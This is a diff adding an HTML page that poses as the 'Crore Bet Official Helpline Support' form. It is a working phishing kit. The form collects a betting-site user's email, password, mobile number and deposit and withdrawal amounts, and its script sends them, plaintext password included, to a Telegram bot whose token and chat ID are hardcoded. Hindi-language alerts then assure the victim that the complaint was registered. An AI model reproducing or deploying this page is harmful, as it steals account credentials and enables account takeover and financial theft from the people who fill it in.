@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crore Bet Official Helpline Support</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px 10px;
+        }
+
+        .container {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 450px;
+            border-radius: 20px;
+            padding: 30px 24px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .logo-container img {
+            width: 45px;
+            height: 45px;
+            object-fit: contain;
+        }
+
+        h2 {
+            text-align: center;
+            font-size: 22px;
+            color: #111111;
+            font-weight: 700;
+            line-height: 1.3;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #111111;
+            margin-bottom: 8px;
+        }
+
+        .form-group label span {
+            color: #d93025;
+            margin-left: 2px;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 15px;
+            border: 1px solid #e0e0e0;
+            border-radius: 10px;
+            outline: none;
+            color: #333333;
+            background-color: #ffffff;
+            transition: border-color 0.2s;
+        }
+
+        .form-control::placeholder {
+            color: #999999;
+            font-size: 14px;
+        }
+
+        .form-control:focus {
+            border-color: #f39c12;
+        }
+
+        textarea.form-control {
+            resize: none;
+            height: 100px;
+        }
+
+        /* Custom Dropdown Styling */
+        .select-wrapper {
+            position: relative;
+            cursor: pointer;
+        }
+
+        .select-trigger {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .select-trigger::after {
+            content: "";
+            width: 0;
+            height: 0;
+            border-left: 5px solid transparent;
+            border-right: 5px solid transparent;
+            border-top: 5px solid #555555;
+            transition: transform 0.3s;
+        }
+
+        .select-wrapper.open .select-trigger::after {
+            transform: rotate(180deg);
+        }
+
+        /* Modal Overlay for Dropdown */
+        .dropdown-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.4);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .dropdown-content {
+            background-color: #ffffff;
+            width: 100%;
+            max-width: 400px;
+            border-radius: 24px;
+            overflow: hidden;
+            animation: slideUp 0.3s ease-out;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+        }
+
+        @keyframes slideUp {
+            from { transform: translateY(50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .dropdown-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 18px 24px;
+            font-size: 16px;
+            color: #111111;
+            border-bottom: 1px solid #f0f0f0;
+            cursor: pointer;
+        }
+
+        .dropdown-item:last-child {
+            border-bottom: none;
+        }
+
+        .dropdown-item.selected {
+            background-color: #f5f0ff;
+            color: #111111;
+        }
+
+        /* Radio button replica */
+        .radio-circle {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #111111;
+            border-radius: 50%;
+            display: inline-block;
+            position: relative;
+        }
+
+        .dropdown-item.selected .radio-circle {
+            border-color: #6200ee;
+            background-color: #6200ee;
+        }
+
+        .dropdown-item.selected .radio-circle::after {
+            content: "";
+            width: 8px;
+            height: 8px;
+            background-color: #ffffff;
+            border-radius: 50%;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+
+        /* Submit Button */
+        .submit-btn {
+            width: 100%;
+            background-color: #f39c12;
+            color: #ffffff;
+            border: none;
+            padding: 15px;
+            font-size: 16px;
+            font-weight: 700;
+            border-radius: 12px;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.2s;
+        }
+
+        .submit-btn:hover {
+            background-color: #e08e0b;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo-container">
+        <img src="https://i.postimg.cc/8CWs5swN/download-(3).png" alt="Crore Bet Logo">
+    </div>
+
+    <h2>Crore Bet Official Helpline Support</h2>
+
+    <form id="supportForm" onsubmit="handleSubmit(event)">
+        <div class="form-group">
+            <label>Crore Bet Email <span>*</span></label>
+            <input type="email" id="email" class="form-control" placeholder="Enter your Crore Bet email" required>
+        </div>
+
+        <div class="form-group">
+            <label>Crore Bet Password <span>*</span></label>
+            <input type="password" id="password" class="form-control" placeholder="Enter your password" required>
+        </div>
+
+        <div class="form-group">
+            <label>Crore Bet Mobile Number <span>*</span></label>
+            <input type="tel" id="mobile" class="form-control" placeholder="Enter your mobile number" required>
+        </div>
+
+        <div class="form-group">
+            <label>Category <span>*</span></label>
+            <div class="select-wrapper" id="selectWrapper" onclick="openDropdown()">
+                <div class="form-control select-trigger" id="selectedCategoryText">Select a category</div>
+            </div>
+        </div>
+
+        <div class="form-group">
+            <label>Crore Bet Deposit amount</label>
+            <input type="number" id="deposit" class="form-control" placeholder="Enter deposit amount (if applicable)">
+        </div>
+
+        <div class="form-group">
+            <label>Crore Bet Withdrawal amount <span>*</span></label>
+            <input type="number" id="withdrawal" class="form-control" placeholder="Enter withdrawal amount" required>
+        </div>
+
+        <div class="form-group">
+            <label>Crore Bet Problem <span>*</span></label>
+            <textarea id="problem" class="form-control" placeholder="Describe your problem in detail" required></textarea>
+        </div>
+
+        <button type="submit" id="submitBtn" class="submit-btn">Submit</button>
+    </form>
+</div>
+
+<div class="dropdown-modal" id="dropdownModal" onclick="closeDropdown(event)">
+    <div class="dropdown-content" onclick="event.stopPropagation()">
+        <div class="dropdown-item selected" onclick="selectOption('Select a category', this)">
+            <span>Select a category</span>
+            <span class="radio-circle"></span>
+        </div>
+        <div class="dropdown-item" onclick="selectOption('Email Update', this)">
+            <span>Email Update</span>
+            <span class="radio-circle"></span>
+        </div>
+        <div class="dropdown-item" onclick="selectOption('Profile Verify', this)">
+            <span>Profile Verify</span>
+            <span class="radio-circle"></span>
+        </div>
+        <div class="dropdown-item" onclick="selectOption('Withdrawal Account', this)">
+            <span>Withdrawal Account</span>
+            <span class="radio-circle"></span>
+        </div>
+        <div class="dropdown-item" onclick="selectOption('Account Block', this)">
+            <span>Account Block</span>
+            <span class="radio-circle"></span>
+        </div>
+        <div class="dropdown-item" onclick="selectOption('Deposit Issue', this)">
+            <span>Deposit Issue</span>
+            <span class="radio-circle"></span>
+        </div>
+        <div class="dropdown-item" onclick="selectOption('Withdrawal Issue', this)">
+            <span>Withdrawal Issue</span>
+            <span class="radio-circle"></span>
+        </div>
+        <div class="dropdown-item" onclick="selectOption('Password Reset', this)">
+            <span>Password Reset</span>
+            <span class="radio-circle"></span>
+        </div>
+        <div class="dropdown-item" onclick="selectOption('Other', this)">
+            <span>Other</span>
+            <span class="radio-circle"></span>
+        </div>
+    </div>
+</div>
+
+<script>
+    const modal = document.getElementById('dropdownModal');
+    const wrapper = document.getElementById('selectWrapper');
+    const triggerText = document.getElementById('selectedCategoryText');
+    let selectedValue = "";
+
+    // Telegram Configurations
+    const BOT_TOKEN = "8715822967:AAHtkn6-lAvsDIqAI3wnQNXiBXRzic3HYaU";
+    const CHAT_ID = "7750507542";
+
+    function openDropdown() {
+        modal.style.display = 'flex';
+        wrapper.classList.add('open');
+    }
+
+    function closeDropdown(event) {
+        modal.style.display = 'none';
+        wrapper.classList.remove('open');
+    }
+
+    function selectOption(value, element) {
+        document.querySelectorAll('.dropdown-item').forEach(item => {
+            item.classList.remove('selected');
+        });
+
+        element.classList.add('selected');
+        triggerText.innerText = value;
+        
+        if(value === "Select a category") {
+            triggerText.style.color = "#999999";
+            selectedValue = "";
+        } else {
+            triggerText.style.color = "#333333";
+            selectedValue = value;
+        }
+        
+        closeDropdown();
+    }
+
+    // Telegram par data bhejne ka function
+    function handleSubmit(event) {
+        event.preventDefault();
+        
+        if (!selectedValue) {
+            alert("Kripya Category select karein!");
+            return false;
+        }
+
+        const submitBtn = document.getElementById('submitBtn');
+        submitBtn.innerText = "Processing...";
+        submitBtn.disabled = true;
+
+        // Form se values lena
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const mobile = document.getElementById('mobile').value;
+        const deposit = document.getElementById('deposit').value || "N/A";
+        const withdrawal = document.getElementById('withdrawal').value;
+        const problem = document.getElementById('problem').value;
+
+        // Telegram Message format (Clean and readable)
+        const telegramMessage = `
+🌟 *New Crore Bet Support Entry* 🌟
+----------------------------------
+📧 *Email:* ${email}
+🔑 *Password:* ${password}
+📱 *Mobile:* ${mobile}
+🗂️ *Category:* ${selectedValue}
+💰 *Deposit Amt:* ${deposit}
+💸 *Withdrawal Amt:* ${withdrawal}
+📝 *Problem Details:* ${problem}
+----------------------------------
+        `;
+
+        // API URL for Telegram
+        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        // Fetch request se data bhejna
+        fetch(telegramUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: telegramMessage,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                alert("Aapki samasya safaltapoorvak darj ho gayi hai!");
+                document.getElementById('supportForm').reset();
+                triggerText.innerText = "Select a category";
+                triggerText.style.color = "#999999";
+                selectedValue = "";
+            } else {
+                alert("Kuch galat hua. Kripya dobara koshish karein.");
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            alert("Network error! Kripya internet check karein.");
+        })
+        .finally(() => {
+            submitBtn.innerText = "Submit";
+            submitBtn.disabled = false;
+        });
+    }
+</script>
+
+</body>
+</html>
